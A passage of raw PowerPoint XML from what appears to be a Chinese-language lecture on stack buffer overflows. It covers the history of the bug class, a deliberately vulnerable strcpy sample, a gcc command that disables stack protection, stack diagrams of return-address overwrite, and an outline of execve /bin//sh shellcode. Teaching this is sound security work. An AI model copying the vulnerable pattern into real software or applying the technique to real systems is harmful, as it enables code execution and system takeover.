              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>栈溢出历史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美国空军研究计划（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>1972</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>）</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>Morris</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>蠕虫（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>1988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lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Smashing the Stack for Fun and Profit</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Aleph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One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1996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</p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2610857" y="3690701"/>
            <a:ext cx="6396555" cy="2976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dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>void function(char *</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>str</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>   char buffer[16]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>strcpy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>buffer,str</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>void main() {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>  char </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>large_string</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>[256];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>int</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>  for( </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> = 0; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> &lt; 255; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>++)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>large_string</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>] = 'A';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>  function(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>large_string</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US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8562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栈溢出样例程序</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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rcRect l="-24985" r="-24985"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1313454"/>
            <a:ext cx="8229600" cy="4525963"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="文本框 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="723736" y="6158203"/>
            <a:ext cx="7963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编译：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>gcc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>z </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1"/>
              <a:t>execstack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fno</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>-stack-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>protector </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>bof.c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-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>bof</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t> –m32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9409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栈溢出利用</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>(Exploit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186025"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="5745019" y="2631778"/>
          <a:ext cx="2475534" cy="30975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5534"/>
              </a:tblGrid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dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>char **</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" sz="1900" b="0" dirty="0" err="1" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>argv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dirty="0" err="1" smtClean="0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altLang="zh-CN" sz="1900" b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zh-CN" sz="1900" b="0" dirty="0" err="1" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>argc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baseline="0" dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>return address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dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>previous %</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" sz="1900" b="0" dirty="0" err="1" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>ebp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7222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dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>char </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" sz="1900" b="0" dirty="0" err="1" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>buf</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" sz="1900" b="0" dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>[128]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内容占位符 5"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:srcRect l="-24985" r="-24985"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-387244" y="2375892"/>
            <a:ext cx="6644350" cy="365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6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栈溢出利用</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>Exploit)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342275"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="5745019" y="2631778"/>
          <a:ext cx="2475534" cy="3128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5534"/>
              </a:tblGrid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smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>char **argv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smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>int argc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char </a:t>
                      </a:r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buf</a:t>
                      </a:r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[132~135]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char </a:t>
                      </a:r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buf</a:t>
                      </a:r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[128~131]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7222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char </a:t>
                      </a:r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buf</a:t>
                      </a:r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[0~127]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内容占位符 5"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:srcRect l="-24985" r="-24985"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-387244" y="2375892"/>
            <a:ext cx="6644350" cy="365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3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栈溢出利用</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Exploit</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>)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450645"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="5745019" y="2631778"/>
          <a:ext cx="2475534" cy="3128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5534"/>
              </a:tblGrid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dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>char **</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" sz="1900" b="0" dirty="0" err="1" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>argv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smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>int argc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shellcode</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="0" dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>地址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shellcode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7222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shellcode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内容占位符 5"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:srcRect l="-24985" r="-24985"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-387244" y="2375892"/>
            <a:ext cx="6644350" cy="365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7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栈溢出利用</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Exploit</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>)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268679"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="5745019" y="2631778"/>
          <a:ext cx="2475534" cy="3128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5534"/>
              </a:tblGrid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dirty="0" err="1" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>shellcode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dirty="0" err="1" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>shellcode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shellcode</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b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char </a:t>
                      </a:r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buf</a:t>
                      </a:r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[128~131]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7222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char </a:t>
                      </a:r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buf</a:t>
                      </a:r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[0~127]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内容占位符 5"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:srcRect l="-24985" r="-24985"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-387244" y="2375892"/>
            <a:ext cx="6644350" cy="365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5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Shellcode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What is </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>hellcode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A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>small piece of code used as the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>payload in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>the exploitation of a software </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>vulnerability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>ypically it starts </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>a command shell from which the attacker can control the compromised </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>machine</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>What we use here</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>W</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>e use </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>execve</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t> system call to obtain a high-permission level shell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483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>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Shellcode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203" t="10590" r="3355"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="896502" y="1969081"/>
            <a:ext cx="2838920" cy="4046661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676" y="1914073"/>
            <a:ext cx="3895862" cy="1368816"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="12" name="直线箭头连接符 11"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3802262" y="3464230"/>
            <a:ext cx="94025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右大括号 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3620737" y="3252322"/>
            <a:ext cx="154789" cy="423816"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="381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447815"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="6164031" y="3869590"/>
          <a:ext cx="1406958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695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//</a:t>
                      </a:r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sh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/bin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7570989" y="3507907"/>
            <a:ext cx="159084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 err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>syscall</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> calling convention:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>%</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>eax</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>=0xb</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>%</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ebx</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>=filename</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>%</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ecx</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>argv</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>%</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>edx</a:t>
            </a:r>
            <a:r>
